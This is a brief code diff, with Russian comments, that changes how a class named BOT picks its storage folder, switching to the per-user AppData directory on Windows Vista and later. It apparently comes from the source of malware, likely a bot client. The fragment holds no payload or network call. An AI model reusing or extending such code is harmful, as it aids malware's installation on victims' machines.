@@ -624,8 +624,27 @@ string BOT::GetBotPath()
 {
 	if (BotData->BotPath.IsEmpty())
 	{
+
+		int CSIDL =  CSIDL_COMMON_APPDATA;
+
+
+		// Временный патч. В Висте и старше получаем папку текущего юзера
+		OSVERSIONINFOEXA OSVersion;
+
+		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
+
+		if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
+		{
+			if ( OSVersion.dwMajorVersion >= 6 )
+			{
+            	CSIDL =  CSIDL_APPDATA;
+            }
+		}
+
+
+
 		// Создаём путь
-		BotData->BotPath =  GetSpecialFolderPathA(CSIDL_COMMON_APPDATA, NULL);
+		BotData->BotPath =  GetSpecialFolderPathA(CSIDL, NULL);
 	}
 	return BotData->BotPath;
 }
